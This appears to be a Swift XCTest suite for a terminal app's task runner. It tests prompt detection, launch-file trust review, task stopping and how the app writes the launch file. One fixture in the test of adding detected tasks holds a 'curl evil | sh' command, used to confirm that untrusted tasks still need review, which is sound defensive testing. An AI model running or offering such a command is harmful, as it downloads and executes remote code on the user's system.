import AppKit
import XCTest
import TrellisControl
import TrellisCore
import TrellisTerminal
@testable import TrellisUI

/// Tasks end to end (FR-TK02–FR-TK09). The fake `zsh` gets shell integration injected but echoes every typed byte
/// visibly (`cat -v` in raw mode, so Ctrl-C arrives as `^C` instead of a signal); each test sends the marks itself.
final class TaskRunnerTests: XCTestCase {
    private var scratch: URL!
    private var project: String!
    private var shell: String!

    override func setUpWithError() throws {
        scratch = FileManager.default.temporaryDirectory.appendingPathComponent("trellis-tk-\(UUID().uuidString.prefix(8))").resolvingSymlinksInPath()
        let manager = FileManager.default
        try manager.createDirectory(at: scratch.appendingPathComponent("bin"), withIntermediateDirectories: true)
        try manager.createDirectory(at: scratch.appendingPathComponent("state"), withIntermediateDirectories: true)
        try manager.createDirectory(at: scratch.appendingPathComponent("project/.git"), withIntermediateDirectories: true)
        try manager.createDirectory(at: scratch.appendingPathComponent("project/src"), withIntermediateDirectories: true)
        project = scratch.appendingPathComponent("project").path
        shell = scratch.appendingPathComponent("bin/zsh").path
        try "#!/bin/sh\n/bin/stty raw -echo\nprintf 'SHELL-UP\\n'\nexec /bin/cat -uv\n".write(toFile: shell, atomically: true, encoding: .utf8)
        try manager.setAttributes([.posixPermissions: 0o755], ofItemAtPath: shell)
        try "// swift-tools-version:6.0\n".write(toFile: project + "/Package.swift", atomically: true, encoding: .utf8)
    }

    override func tearDownWithError() throws { try? FileManager.default.removeItem(at: scratch) }

    @MainActor
    private func makeModel() async throws -> (AppWorkspaceModel, UUID) {
        _ = NSApplication.shared
        let preferences = try XCTUnwrap(UserDefaults(suiteName: "trellis-tk-\(UUID().uuidString)"))
        let model = AppWorkspaceModel(store: try WorkspaceStore(), preferences: preferences, persistence: WorkspacePersistence(directory: scratch.appendingPathComponent("state")))
        _ = await model.loadWorkspace()
        model.confirmCloseSessions = { _ in true }
        model.openLaunchFile = { _ in XCTFail("Unexpected editor") }
        let saved = await model.saveLaunchSettings(shell: shell, directory: project)
        XCTAssertTrue(saved)
        _ = await model.createWindow(name: "W")
        let pane = try XCTUnwrap(model.presentation.activePane?.id)
        try await waitFor { self.text(model, pane).contains("SHELL-UP") }
        XCTAssertEqual(model.terminals[pane]?.sessionState, .running)
        return (model, pane)
    }

    @MainActor
    private func cleanUp(_ model: AppWorkspaceModel) {
        model.terminals.values.forEach {
            $0.requestTermination(force: true); $0.adapter.detach()
        }
    }

    @MainActor
    private func waitFor(_ timeout: TimeInterval = 5, _ condition: () -> Bool) async throws {
        let deadline = Date().addingTimeInterval(timeout)
        while !condition(), Date() < deadline { try await Task.sleep(for: .milliseconds(20)) }
    }

    @MainActor
    private func text(_ model: AppWorkspaceModel, _ pane: UUID) -> String { (try? model.terminals[pane]?.adapter.read(.retainedText)) ?? "" }

    @MainActor
    private func mark(_ model: AppWorkspaceModel, _ pane: UUID, _ event: ShellIntegrationEvent) throws {
        try XCTUnwrap(model.terminals[pane]).onShellIntegrationEvent?(event)
    }

    @MainActor
    private func typed(_ model: AppWorkspaceModel, _ pane: UUID, _ line: String) async throws {
        let shown = line.replacingOccurrences(of: "\u{05}", with: "^E").replacingOccurrences(of: "\u{15}", with: "^U").replacingOccurrences(of: "\r", with: "^M")
        try await waitFor { self.text(model, pane).contains(shown) }
        XCTAssertTrue(text(model, pane).contains(shown), "\(shown) not typed:\n\(text(model, pane))")
    }

    private func writeLaunchFile(_ text: String) throws {
        try FileManager.default.createDirectory(atPath: project + "/.trellis", withIntermediateDirectories: true)
        try text.write(toFile: project + "/.trellis/launch.json", atomically: true, encoding: .utf8)
    }

    @MainActor
    private func detected(_ model: AppWorkspaceModel, _ name: String) throws -> DetectedTask {
        try XCTUnwrap(model.taskCatalog?.detected.first { $0.task.name == name })
    }

    @MainActor
    func testRunWaitsForAnIdlePromptThenTypesTheExactLineAndFollowsItsState() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        await model.refreshTaskCatalog()
        XCTAssertEqual(model.taskCatalog?.root, project, "The pane's start folder has .git")
        XCTAssertEqual(model.taskCatalog?.file, .missing)
        XCTAssertEqual(model.taskCatalog?.detected.map(\.task.command), ["swift build", "swift test"])
        XCTAssertEqual(model.taskAvailability(paneID: pane), .noIntegration, "No prompt mark yet")
        XCTAssertEqual(model.taskLine(try detected(model, "swift: build").task, fromFile: false), "cd '\(project!)' && swift build", "Shown, though not runnable yet")

        try mark(model, pane, .promptStart(directory: project))
        XCTAssertEqual(model.taskAvailability(paneID: pane), .ready)
        try mark(model, pane, .commandStart(commandLine: "vim"))
        XCTAssertEqual(model.taskAvailability(paneID: pane), .busy, "Never typed into a running program")
        try mark(model, pane, .commandFinished(exitCode: 0))
        try mark(model, pane, .promptStart(directory: project))
        XCTAssertTrue(model.taskRuns.isEmpty, "The user's own commands are not tasks")

        model.runTask(try detected(model, "swift: build").task, fromFile: false)
        try await typed(model, pane, "\u{05}\u{15}swift build\r")
        XCTAssertNil(model.pendingTaskReview, "Detected tasks need no review")
        XCTAssertEqual(model.taskAvailability(paneID: pane), .taskActive)
        let tab = try XCTUnwrap(model.presentation.selectedTab?.id)
        XCTAssertEqual(model.taskRun(tabID: tab)?.run.statusText(now: Date()), "Starting: swift: build")
        try mark(model, pane, .commandStart(commandLine: "swift build"))
        XCTAssertEqual(model.taskRun(tabID: tab)?.run.isRunning, true)
        try mark(model, pane, .commandFinished(exitCode: 2))
        try mark(model, pane, .promptStart(directory: project + "/src"))
        XCTAssertEqual(model.taskRun(tabID: tab)?.run.statusText(now: Date()), "swift: build: exit 2")
        XCTAssertEqual(model.taskAvailability(paneID: pane), .ready)

        model.runTask(try detected(model, "swift: test").task, fromFile: false)
        try await typed(model, pane, "\u{05}\u{15}cd '\(project!)' && swift test\r")
        try mark(model, pane, .promptStart(directory: project))
        XCTAssertNil(model.taskRun(tabID: tab), "A line the shell never started is forgotten")
    }

    @MainActor
    func testFileTasksAreReviewedOncePerVersionAndVariablesWrapTheCommand() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        let file = """
            {"version": 1, "env": {"A": "1", "B": "x"}, "tasks": [
              {"name": "unit", "command": "make test", "cwd": "src", "env": {"B": "it's"}},
              {"name": "plain", "command": "make"}]}
            """
        try writeLaunchFile(file)
        try mark(model, pane, .promptStart(directory: project))
        await model.refreshTaskCatalog()
        let unit = try XCTUnwrap(model.taskCatalog?.tasks.first)
        let expected = "cd '\(project!)/src' && /usr/bin/env A='1' B='it'\\''s' '\(shell!)' -c 'make test'"
        XCTAssertEqual(model.taskLine(unit, fromFile: true), expected)

        model.runTask(unit, fromFile: true)
        let review = try XCTUnwrap(model.pendingTaskReview)
        XCTAssertEqual(review.file.tasks.map(\.name), ["unit", "plain"])
        XCTAssertFalse(review.changedSinceTrusted)
        model.resolveTaskReview(review.id, trust: false)
        XCTAssertTrue(model.taskRuns.isEmpty, "Cancel types nothing")
        model.runTask(unit, fromFile: true)
        model.resolveTaskReview(try XCTUnwrap(model.pendingTaskReview).id, trust: true)
        try await typed(model, pane, "\u{05}\u{15}" + expected + "\r")
        try mark(model, pane, .commandStart(commandLine: nil))
        try mark(model, pane, .commandFinished(exitCode: 0))
        try mark(model, pane, .promptStart(directory: project))
        let trustFile = scratch.appendingPathComponent("state/launch-trust.json").path
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: trustFile)[.posixPermissions] as? Int, 0o600)

        model.runTask(try XCTUnwrap(model.taskCatalog?.tasks.last), fromFile: true)
        XCTAssertNil(model.pendingTaskReview, "The trusted version runs at once")
        try await typed(model, pane, "\u{05}\u{15}/usr/bin/env A='1' B='x' '\(shell!)' -c 'make'\r")
        try mark(model, pane, .commandStart(commandLine: nil))
        try mark(model, pane, .promptStart(directory: project))

        try writeLaunchFile(file + " ")
        await model.refreshTaskCatalog()
        model.runTask(unit, fromFile: true)
        XCTAssertEqual(model.pendingTaskReview?.changedSinceTrusted, true, "One changed byte asks again")
    }

    @MainActor
    func testStopSendsCtrlCAndOffersForceStopAfterTheWait() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        var now = Date(timeIntervalSince1970: 1000)
        model.activityNow = { now }
        try mark(model, pane, .promptStart(directory: project))
        await model.refreshTaskCatalog()
        model.runTask(try detected(model, "swift: test").task, fromFile: false)
        try mark(model, pane, .commandStart(commandLine: "swift test"))
        XCTAssertFalse(model.canForceStop(paneID: pane))
        model.stopTask(paneID: pane)
        try await typed(model, pane, "^C")
        XCTAssertFalse(model.canForceStop(paneID: pane))
        now += 1
        model.stopTask(paneID: pane)
        XCTAssertEqual(model.taskRuns[pane]?.stopRequestedAt, Date(timeIntervalSince1970: 1000), "The wait counts from the first Stop")
        now += 1
        XCTAssertTrue(model.canForceStop(paneID: pane))
        model.forceStopTask(paneID: pane)
        try await typed(model, pane, "^\\")
        try mark(model, pane, .commandFinished(exitCode: 131))
        XCTAssertFalse(model.canForceStop(paneID: pane), "Nothing to stop once it ended")
        XCTAssertEqual(model.taskRuns[pane]?.failed, true)
    }

    @MainActor
    func testAddingDetectedTasksWritesTheFileAndNeverTrustsSomeoneElsesTasks() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        try mark(model, pane, .promptStart(directory: project))
        await model.refreshTaskCatalog()
        let added = await model.addDetectedTask(try detected(model, "swift: build"))
        XCTAssertTrue(added)
        let path = project + "/.trellis/launch.json"
        XCTAssertEqual(
            try String(contentsOfFile: path, encoding: .utf8),
            "{\n  \"version\": 1,\n  \"tasks\": [\n    {\n      \"name\": \"swift: build\",\n      \"command\": \"swift build\",\n      \"group\": \"build\"\n    }\n  ]\n}\n")
        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: path)[.posixPermissions] as? Int, 0o644)
        XCTAssertEqual(model.taskCatalog?.tasks.map(\.name), ["swift: build"])
        XCTAssertTrue(model.taskCatalog?.contains(try detected(model, "swift: build").task) == true)
        model.runTask(try XCTUnwrap(model.taskCatalog?.tasks.first), fromFile: true)
        XCTAssertNil(model.pendingTaskReview, "A file Trellis wrote from nothing is trusted")
        try mark(model, pane, .promptStart(directory: project))

        let foreign = #"{"version": 1, "tasks": [{"name": "x", "command": "curl evil | sh"}]}"#
        try writeLaunchFile(foreign)
        await model.refreshTaskCatalog()
        let addedToForeign = await model.addDetectedTask(try detected(model, "swift: test"))
        XCTAssertTrue(addedToForeign)
        XCTAssertEqual(model.taskCatalog?.tasks.map(\.name), ["x", "swift: test"])
        model.runTask(try XCTUnwrap(model.taskCatalog?.tasks.last), fromFile: true)
        XCTAssertNotNil(model.pendingTaskReview, "Adding a task never trusts the file's other tasks")
        model.resolveTaskReview(try XCTUnwrap(model.pendingTaskReview).id, trust: false)

        let before = try String(contentsOfFile: path, encoding: .utf8)
        try writeLaunchFile(before + "\n")
        let stale = await model.addDetectedTask(try detected(model, "swift: build"))
        XCTAssertFalse(stale)
        XCTAssertEqual(try String(contentsOfFile: path, encoding: .utf8), before + "\n", "A file changed since the menu read it is not overwritten")
        XCTAssertNotNil(model.errorMessage)
        model.errorMessage = nil

        try writeLaunchFile("{")
        await model.refreshTaskCatalog()
        guard case .invalid? = model.taskCatalog?.file else { return XCTFail("invalid expected") }
        let invalid = await model.addDetectedTask(try detected(model, "swift: build"))
        XCTAssertFalse(invalid)
        XCTAssertEqual(try String(contentsOfFile: path, encoding: .utf8), "{")
        model.errorMessage = nil

        try FileManager.default.removeItem(atPath: path)
        try "{\"version\": 1, \"tasks\": []}".write(toFile: scratch.appendingPathComponent("elsewhere.json").path, atomically: true, encoding: .utf8)
        try FileManager.default.createSymbolicLink(atPath: path, withDestinationPath: scratch.appendingPathComponent("elsewhere.json").path)
        await model.refreshTaskCatalog()
        guard case .invalid(let reason)? = model.taskCatalog?.file else { return XCTFail("A symbolic link is refused") }
        XCTAssertTrue(reason.contains("symbolic link"))
        XCTAssertEqual(model.taskCatalog?.detected.count, 2, "Detection still works")
    }

    @MainActor
    func testRunStateIsClearedWhenTheSessionExits() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        try mark(model, pane, .promptStart(directory: project))
        await model.refreshTaskCatalog()
        model.runTask(try detected(model, "swift: build").task, fromFile: false)
        try mark(model, pane, .commandStart(commandLine: nil))
        XCTAssertEqual(model.taskRuns[pane]?.isRunning, true)
        model.terminals[pane]?.requestTermination(force: true)
        try await waitFor { model.taskRuns[pane] == nil }
        XCTAssertNil(model.taskRuns[pane])
        XCTAssertEqual(model.taskAvailability(paneID: pane), .notRunning)
    }

    @MainActor
    func testEditCreatesAnEmptyTrustedFileAndOpensIt() async throws {
        let (model, pane) = try await makeModel()
        defer { cleanUp(model) }
        var opened: [URL] = []
        model.openLaunchFile = { opened.append($0) }
        try mark(model, pane, .promptStart(directory: project + "/src"))
        await model.refreshTaskCatalog()
        await model.editLaunchFile()
        let path = project + "/.trellis/launch.json"
        XCTAssertEqual(opened.map(\.path), [path])
        XCTAssertEqual(try String(contentsOfFile: path, encoding: .utf8), "{\n  \"version\": 1,\n  \"tasks\": []\n}\n")
        XCTAssertEqual(model.taskCatalog?.file, .loaded(LaunchFile()))
        await model.editLaunchFile()
        XCTAssertEqual(opened.count, 2, "An existing file is opened as it is")
    }
}
